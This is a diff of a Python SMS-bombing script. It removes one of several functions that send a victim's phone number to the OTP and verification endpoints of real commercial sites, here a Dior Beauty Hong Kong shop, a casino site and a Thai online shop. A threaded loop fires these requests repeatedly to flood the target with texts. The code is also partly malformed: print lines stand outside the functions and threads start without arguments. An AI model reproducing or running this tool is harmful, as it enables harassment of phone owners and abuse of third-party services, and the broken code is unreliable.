@@ -64,9 +64,6 @@ print (f"Send number {phone} | Success ✓")
 def sk8(phone):
     post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})
 print (f"Send number {phone} | Success ✓")
-def sk9(phone):
-post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})
-print (f"Send number {phone} | Success ✓")
 
 def sk10(phone):
     post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone":
@@ -129,7 +126,6 @@ for i in range(amount):
 	threading.Thread(target=sk6).start()
 	threading.Thread(target=sk7).start()
 	threading.Thread(target=sk8).start()
-	threading.Thread(target=sk9).start()
 	threading.Thread(target=sk10).start()
 	threading.Thread(target=sk11).start()
 	threading.Thread(target=sk12).start()
